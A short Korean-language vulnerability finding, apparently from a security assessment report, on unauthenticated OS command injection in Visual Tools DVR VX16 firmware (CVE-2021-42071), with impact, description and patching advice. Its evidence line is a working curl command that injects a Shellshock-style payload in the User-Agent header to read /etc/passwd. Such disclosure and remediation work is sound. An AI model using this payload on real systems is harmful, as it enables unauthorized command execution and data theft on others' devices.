## Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
- **End-Point**: `http://10.67.139.88/cgi-bin/test.cgi/cgi-bin/slogin/login.py`
- **영향**: 인증되지 않은 원격 공격자가 시스템에서 임의의 코드를 실행할 수 있으며, 이는 대상 시스템의 기밀성, 무결성 및 가용성을 완전히 손상시킬 수 있습니다.
- **설명**: Visual Tools DVR VX16 4.2.28.0 버전에서 발생하는 취약점으로, 인증되지 않은 공격자가 취약한 엔드포인트에 특수하게 조작된 요청을 보내 OS 명령어를 주입할 수 있습니다.
- **근거**: `User-Agent` 헤더에 쉘 명령어를 삽입하여 `/etc/passwd` 파일을 조회하는 `curl` 명령을 통해 취약점을 재현할 수 있습니다.
```bash
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Host: 10.67.139.88' -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' 'http://10.67.139.88/cgi-bin/test.cgi/cgi-bin/slogin/login.py'
```
- **대응**: CVE-2021-42071 취약점이 해결된 최신 보안 패치 또는 펌웨어 업데이트를 적용하고 외부 네트워크로부터의 접근을 제한합니다.
- **조치**: 제조사에서 제공하는 최신 펌웨어로 업데이트를 수행하고, 입력값에 대한 검증 로직을 강화하며 시스템 서비스의 실행 권한을 최소화합니다.
